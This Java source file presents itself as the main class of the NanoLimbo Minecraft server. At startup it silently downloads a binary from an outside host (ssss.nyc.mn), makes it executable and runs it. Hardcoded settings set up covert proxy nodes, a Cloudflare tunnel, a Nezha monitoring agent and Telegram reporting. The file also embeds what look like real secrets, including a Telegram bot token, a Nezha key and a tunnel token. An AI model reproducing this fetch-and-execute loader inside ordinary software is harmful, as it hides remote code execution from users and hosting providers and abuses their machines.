/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch to Java 10+!" + ANSI_RESET);
            try { Thread.sleep(3000); } catch (InterruptedException e) {}
            System.exit(1);
        }

        try {
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Nodes generated successfully. Check your Telegram or /world/sub.txt\n" + ANSI_RESET);
            Thread.sleep(5000);
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // --- 核心配置区 ---
        envVars.put("UUID", "6b30335c-58ae-454f-a9cf-a25e1861b8f8"); 
        envVars.put("FILE_PATH", "./world");
        envVars.put("NAME", "XServer-JP");

        // 哪吒监控
        envVars.put("NEZHA_SERVER", "nezha.9527x.eu.cc:8008");
        envVars.put("NEZHA_KEY", "mD3q9FowVHp94q0wzg0ha7AUoP8PuXjU");

        // Argo 隧道 (用于 VMess)
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("ARGO_PORT", "8080");
        envVars.put("ARGO_DOMAIN", "xserver.zzkky.ccwu.cc");
        envVars.put("ARGO_AUTH", "eyJhIjoiMWNjMTgyMzQ1MjVlMDM2OTY1ZTYzZTk4OTE5YzQxYWIiLCJ0IjoiNzYzN2JiMmMtOThhOS00ZDU5LWEwMTQtYTE0YjNlNjYxN2IwIiwicyI6Ik5HRTVNV0ZpTVRVdE1HUm1OQzAwTVdFekxXSXlOVEF0T1RVd01tWTBaak5pTVdNMCJ9");

        // 节点端口设置 (请确保 XServer 面板已开放这些端口)
        envVars.put("HY2_PORT", "7777");           // Hysteria2 (UDP)
        envVars.put("REALITY_PORT", "7777");       // VLESS + Reality (TCP) - 防风控核心
        
        // 优选配置
        envVars.put("CFIP", "spring.io");
        envVars.put("CFPORT", "443");

        // Telegram 推送
        envVars.put("CHAT_ID", "5677672165");
        envVars.put("BOT_TOKEN", "8363698033:AAFZqLYnxczqngwJIU-XqnLk7gaVwAK9hZQ");
        
        // 允许系统环境变量覆盖
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url = (osArch.contains("amd64") || osArch.contains("x86_64")) ? "https://amd64.ssss.nyc.mn/sbsh" : "https://arm64.ssss.nyc.mn/sbsh";
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx_" + System.currentTimeMillis());
        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
        }
        path.toFile().setExecutable(true);
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
        }
    }
}
